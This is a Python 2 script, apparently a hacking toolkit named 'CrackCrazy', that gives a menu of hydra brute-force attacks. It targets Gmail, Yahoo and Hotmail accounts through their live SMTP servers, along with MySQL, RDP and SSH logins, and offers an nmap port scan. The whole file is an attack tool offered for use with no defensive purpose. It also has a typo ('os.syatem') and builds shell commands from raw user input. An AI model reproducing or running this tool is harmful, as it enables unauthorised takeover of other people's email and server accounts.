import os, sys, time
from time import sleep as timeout
def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
os.system("clear")
#wallpaper
print ('''
\033[91m
           +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+
           |C| |r| |a| |c| |k| |C| |r| |a| |z| |y|
           +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+ +-+
               \033[92m[127.0.0.1]\033[93m|_|\033[92m[127.217.21.78]
                   \033[92m[\033[93mCodec By Codename\033[92m]
''')
print
print "           \033[91m[\033[94m1\033[91m]\033[93m> \033[92mGmail BruteForcer        "
print "           \033[91m[\033[94m2\033[91m]\033[93m> \033[92mYahoo BruteForcer        "
print "           \033[91m[\033[94m3\033[91m]\033[93m> \033[92mHotmail Bruteforcer      "
print "           \033[91m[\033[94m4\033[91m]\033[93m> \033[92mnmap portscanner         "
print "           \033[91m[\033[94m5\033[91m]\033[93m> \033[92mMySQL Bruteforcer        "
print "           \033[91m[\033[94m6\033[91m]\033[93m> \033[92mRDP Bruteforcer          "
print "           \033[91m[\033[94m7\033[91m]\033[93m> \033[92mSSH Bruteforcer          "
print 
print "           \033[91m[\033[94m0\033[91m]\033[93m> \033[92mExit "
print
codec = raw_input("root@kalilinux ~# ")

if codec == "1" or codec == "01":
  os.system("clear")
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()

elif codec == "2" or codec == "02":
    os.system("clear")
    email = raw_input("[*] Email : ")
    word = raw_input("[*] Wordlist : ")
    os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
    sys.exit()

elif codec == "3" or codec == "03":
    os.system("clear")
    email = raw_input("[*] Email : ")
    word = raw_input("[*] Wordlist : ")
    os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
    sys.exit()

elif codec == "4" or codec == "04":
    os.system("clear")
    host = raw_input("Host : ")
    os.system("nmap %s" % (host)) 

elif codec == "5" or codec == "05":
    os.syatem("clear")
    user = raw_input("[*] User : ")
    word = raw_input("[*] Wordlist : ")
    os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
    
elif codec == "6" or codec == "06":
    os.system("clear")
    user = raw_input("[*] User : ")
    word = raw_input("[*] Wordlist : ")
    iphost = raw_input("[*] IP/Hostname : ")
    os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
    sys.exit()
    
elif codec == "7" or codec == "07":
    os.system("clear")
    user = raw_input("[*] User : ")
    word = raw_input("[*] Wordlist : ")
    iphost = raw_input("[*] IP/Hostname : ")
    os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
    sys.exit()
    
elif codec == "0" or codec == "00":
    sys.exit()
    
else:
     print "\nERROR: Wrong Input"
     timeout(3)
     restart_program()